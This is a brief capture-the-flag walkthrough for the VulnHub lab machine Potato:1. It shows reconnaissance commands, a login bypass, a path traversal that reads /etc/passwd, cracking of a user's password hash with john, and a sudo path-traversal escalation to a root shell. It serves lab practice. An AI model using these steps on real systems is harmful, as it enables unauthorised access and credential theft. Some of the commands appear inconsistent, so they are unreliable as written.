

# Potate:1 Walkthrough

**VulnHub Link:** [Potate:1](https://www.vulnhub.com/entry/potato-1,529/)
**Difficulty:** Easy
**Release Date:** 2 Aug 2020


## 1.Reconnaissance
```bash
nmap -A -O -T4 -P -sV 192.168.100.175
```
## 2.Web Enumeration
```bash
dirb http://192.168.100.175
```

in burpsuite change password to --> password[]

and pass cookie found as password then with burpsuite , ../../../../../../etc/passwd found

florianges and webadmin users found

```bash
webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash

echo "webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/" > hash.txt

john hash.txt --wordlist=rockyou.txt
```
webadmin password --> dragon

user flag captured
```bash
sudo -l --> /bin/nice /notes/*

cp /bin/bash runme.sh

sudo /bin/bash /notes/../home/webadmin/runme.sh
```
root shell opened and root flag captured.
